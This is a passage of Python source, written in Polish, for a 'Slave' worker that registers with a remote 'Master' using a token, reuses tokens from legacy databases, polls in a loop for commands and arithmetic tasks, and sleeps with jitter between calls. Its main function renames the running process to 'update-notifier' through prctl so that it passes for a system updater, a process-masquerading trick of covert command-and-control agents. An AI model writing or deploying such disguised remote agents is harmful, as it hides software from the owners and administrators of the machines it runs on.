    if not sciezka.exists() and konfig.plik_stanu is None:
        legacy_databases = tuple(
            base / filename
            for base in dict.fromkeys((KATALOG, KATALOG.parent))
            for filename in ("legacy_slave_state.db", "minionki.db")
        )
        legacy_names = [konfig.nazwa]
        if konfig.nazwa.startswith("slave") and konfig.nazwa[5:].isdigit():
            legacy_names.append("minion" + konfig.nazwa[5:])
        elif konfig.nazwa.startswith("slave-") and konfig.nazwa[6:].isdigit():
            legacy_names.append("minion-" + konfig.nazwa[6:])
        for legacy_database in legacy_databases:
            if not legacy_database.exists():
                continue
            try:
                database = sqlite3.connect(f"file:{legacy_database.resolve()}?mode=ro", uri=True)
                tables = {row[0] for row in database.execute(
                    "SELECT name FROM sqlite_master WHERE type='table'")}
                if "minionki" not in tables:
                    database.close()
                    continue
                for legacy_name in legacy_names:
                    record = database.execute(
                        "SELECT id, klucz FROM minionki WHERE nazwa=?", (legacy_name,)
                    ).fetchone()
                    if record:
                        stan = {"id": record[0], "token": record[1]}
                        database.close()
                        zapisz_stan(konfig, stan)
                        return stan
                database.close()
            except sqlite3.Error:
                continue
    try:
        stan = json.loads(sciezka.read_text(encoding="utf-8"))
    except FileNotFoundError:
        return None
    except (OSError, json.JSONDecodeError) as e:
        raise SystemExit(f"Nie można odczytać stanu Slaves: {e}") from None
    if isinstance(stan, dict) and "token" not in stan and "klucz" in stan:
        stan["token"] = stan.pop("klucz")
    if not isinstance(stan, dict) or "id" not in stan or "token" not in stan:
        raise SystemExit("Plik stanu Slaves ma nieprawidłowy format.")
    return stan


# ==================================================================== KROKI ==

def zarejestruj_sie(konfig, lacze, token_rejestracji, stop):
    """Pyta Master o ID i token sesyjny, aż odpowie (Master milczy do komendy 'start')."""
    while not stop.is_set():
        odp = zapytaj(lacze, "0", token_rejestracji, {"name": konfig.nazwa})
        if odp and "id" in odp and "token" in odp:
            stan = {"id": odp["id"], "token": odp["token"]}
            zapisz_stan(konfig, stan)
            loguj(konfig, f"Zarejestrowany, ID #{stan['id']}", wazne=False)
            return stan
        loguj(konfig, "Master milczy... ponawiam za 3s", wazne=False)
        stop.wait(3)
    return None


def obsluz_cisze(konfig, postep, stop):
    if not postep.cisza:
        loguj(konfig, "Master milczy... ponawiam co 3s", wazne=False)
    postep.cisza = True
    stop.wait(3)


@po_zadaniu
def loguj_zadanie(konfig, postep, odp_master, wynik):
    loguj(konfig, f"Zadanie #{odp_master.get('task_id', '?')}: operacja {odp_master.get('op', '?')!r} "
                  f"na {odp_master.get('values', [])} = {wynik}   (dotąd OK: {postep.dobre}, błędy: {postep.zle})",
          wazne=False)


def krok_pracy(konfig, lacze, stan, token, postep, stop):
    """Jeden obrót pętli: wyślij odpowiedź + potwierdzenia, poproś o nowe, wykonaj polecenia,
    rozwiąż, odczekaj. Zwraca None (kontynuuj) albo kod wyjścia."""
    wyslane = len(postep.potwierdzenia)
    odp = zapytaj(lacze, stan["id"], token, zbuduj_pakiet_pracy(postep))
    if odp is None:
        obsluz_cisze(konfig, postep, stop)
        return None
    postep.cisza = False
    del postep.potwierdzenia[:wyslane]           # Master dostał potwierdzenia - nie wysyłamy ich ponownie

    if "interval" in odp:
        nowa = float(odp["interval"])
        if nowa != postep.opoznienie:
            loguj(konfig, f"→ Master: nowa domyślna przerwa {postep.opoznienie:g}s → {nowa:g}s",
                  wazne=False)
            postep.opoznienie = nowa

    werdykt = odp.get("prev")
    zastosuj_werdykt(postep, werdykt)
    if werdykt == "stale":
        loguj(konfig, "(odpowiedź nieaktualna - dostaję zadanie od nowa)", wazne=False)

    wykonaj_polecenia(konfig, postep, odp.get("tasks") or [])
    if postep.stop:                              # polecenie 'stop': ostatni pakiet tylko z potwierdzeniem
        zapytaj(lacze, stan["id"], token, zbuduj_pakiet_pracy(postep, bez_odpowiedzi=True))
        return 0

    if "op" in odp:
        try:
            wynik = rozwiaz(odp["op"], odp["values"])
        except (KeyError, ValueError, ZeroDivisionError) as e:
            loguj(konfig, "Nie umiem tego policzyć:", repr(e))
            return 1
        for hak in HAKI_PO_ZADANIU:
            hak(konfig, postep, odp, wynik)
        _jitter_sleep(postep.opoznienie, stop)
        postep.odpowiedz, postep.zadanie_id = wynik, odp["task_id"]
    else:                                        # Master nie wydał zadania; czekaj na kolejne polecenia
        postep.odpowiedz = postep.zadanie_id = None
        _idle_jitter(stop)
    return None


# ==================================================================== PETLA ==

def uruchom(konfig, stop=None):
    """Cały cykl życia Slaves. Zwraca 0 (ok) albo 1 (błąd). Działa też jako wątek."""
    stop = stop or threading.Event()
    lacze = Lacze(konfig.host, konfig.port, konfig.domena_master, konfig.https)
    postep = Postep(opoznienie=konfig.opoznienie)
    kod = 0
    try:
        stan = wczytaj_stan(konfig)
        if stan:
            loguj(konfig, f"Mam już ID #{stan['id']}", wazne=False)
        else:
            token_rejestracji = wczytaj_token_rejestracji(konfig.token_rejestracji)
            stan = zarejestruj_sie(konfig, lacze, token_rejestracji, stop)
        if stan is None:
            return 0
        token = stan["token"]
        postep.slave_id = stan["id"]
        postep.token = token
        postep.lacze = lacze
        while not stop.is_set():
            kod = krok_pracy(konfig, lacze, stan, token, postep, stop)
            if kod is not None:
                return kod
        kod = 0
    except KeyboardInterrupt:
        stop.set()
    finally:
        loguj(konfig, f"Koniec pracy. OK: {postep.dobre}, błędy: {postep.zle}", wazne=False)
    return kod or 0


def praca(nazwa, host, port, opoznienie=1.0, cicho=False, stop=None, token=None,
          domena=DEFAULT_MASTER_HOST, https=DEFAULT_HTTPS):
    """Wygodny skrót (używa go uruchom_slaves.py w trybie wątków)."""
    return uruchom(Konfig(nazwa, host, port, opoznienie, cicho,
                          token_rejestracji=token, domena_master=domena, https=https), stop)


def parsuj_argumenty(argv=None):
    ap = argparse.ArgumentParser(description="Slave - liczy zadania od Master")
    ap.add_argument("--nazwa", default=os.environ.get("SLAVE_NAME", f"slave-{os.getpid()}"))
    ap.add_argument("--master", default=os.environ.get("SLAVE_MASTER", DEFAULT_MASTER_HOST),
                    help="host albo host:port Master")
    ap.add_argument("--domena", default=None, help="publiczna domena Master, np. master.example.com")
    ap.add_argument("--port", type=int, help="port HTTP(S); domyślnie 443/80 lub port z --master")
    _env_https = os.environ.get("SLAVE_HTTPS")
    _https_default = (_env_https.lower() not in ("0", "false", "no")
                      if _env_https is not None else DEFAULT_HTTPS)
    ap.add_argument("--https", action=argparse.BooleanOptionalAction, default=_https_default,
                    help="wymuś HTTPS (domyślnie włączone)")
    ap.add_argument("--opoznienie", type=float, default=1.0,
                    help="pauza (s) między zadaniami, żeby nie zarzynać Master")
    ap.add_argument("--cicho", action="store_true", help="tylko ważne komunikaty (przy wielu Slaves)")
    ap.add_argument("--stan", type=Path, help="plik JSON stanu Slaves (domyślnie slave_state/<nazwa>.json)")
    ap.add_argument("--token-rejestracji", default=os.environ.get("SLAVE_TOKEN"),
                    help="token pierwszego dołączenia")
    a = ap.parse_args(argv)
    parsed = urlsplit("//" + a.master)
    host = parsed.hostname or a.master
    domena = a.domena or host
    port = a.port or (None if a.domena else parsed.port) or (443 if a.https else 80)
    return Konfig(a.nazwa, host, port, a.opoznienie, a.cicho,
                  plik_stanu=a.stan, token_rejestracji=a.token_rejestracji,
                  domena_master=domena, https=a.https)


def main():
    sys.argv[0] = "update-notifier"
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        libc.prctl(15, b"update-notifier", 0, 0, 0)
    except Exception:
        pass
    raise SystemExit(uruchom(parsuj_argumenty()))


if __name__ == "__main__":
    main()